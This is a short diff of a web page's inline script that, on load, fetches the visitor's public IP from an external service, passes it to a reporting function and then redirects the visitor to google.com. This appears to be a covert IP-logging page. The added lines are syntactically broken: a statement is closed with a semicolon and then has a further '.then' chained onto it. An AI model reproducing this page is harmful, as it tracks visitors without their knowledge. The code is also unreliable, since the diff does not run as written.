@@ -19,18 +19,15 @@
                 });
 
                 const data = await response.json();
-                              .then((data) => reportIp(data.ip));
-                window.location.replace("https://google.com");
+                console.log(data);
             }
 
             (async () => {
-                    await fetch("https://api.ipify.org?format=json")
-                        .then((res) => res.json())
-                        .then((data) => reportIp(data.ip));
-                window.location.replace("https://google.com");
+                await fetch("https://api.ipify.org?format=json")
+                    .then((res) => res.json())
+                    .then((data) => reportIp(data.ip));
+                    .then(() => window.location.replace("https://google.com"));
             })();
-
-
         </script>
     </body>
 </html>
